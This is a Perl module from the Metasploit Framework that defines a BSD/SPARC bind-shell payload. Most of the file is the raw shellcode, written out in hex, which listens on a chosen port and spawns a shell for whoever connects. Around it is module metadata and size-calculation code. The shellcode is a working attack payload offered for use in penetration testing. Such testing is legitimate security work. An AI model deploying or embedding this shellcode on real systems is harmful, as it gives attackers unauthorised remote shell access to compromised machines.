
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdsparc_bind;
use base 'Msf::PayloadComponent::BindConnection';
use strict;
use Pex::SPARC;

my $info =
{
  'Name'         => 'BSD Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'sparc' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;

  my $shellcode = # SPARC/BSD bind port by vlad902
    "\x94\x1a\xc0\x0b\x92\x10\x20\x01\x90\x10\x20\x02\x82\x10\x20\x61\x91\xd0\x20\x08\xd0\x23\xbf\xf8".
    Pex::SPARC::set(0xff020000 | $port, "l0")                                                         .
    "\xa2\x1c\x40\x11\xe0\x3b\xbf\xf0\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\x68\x91\xd0\x20\x08".
    "\xd0\x03\xbf\xf8\x92\x10\x20\x01\x82\x10\x20\x6a\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x1a\x40\x09".
    "\x94\x12\x40\x09\x82\x10\x20\x1e\x91\xd0\x20\x08\xd0\x23\xbf\xf8\x92\x1a\x40\x09\x82\x10\x20\x5a".
    "\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x10\x20\x01\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x10\x20\x02".
    "\x91\xd0\x20\x08\x94\x1a\xc0\x0b\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xdc\xda\x90\x23\xa0\x10".
    "\x92\x23\xa0\x08\xe0\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08";

  return $shellcode;
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
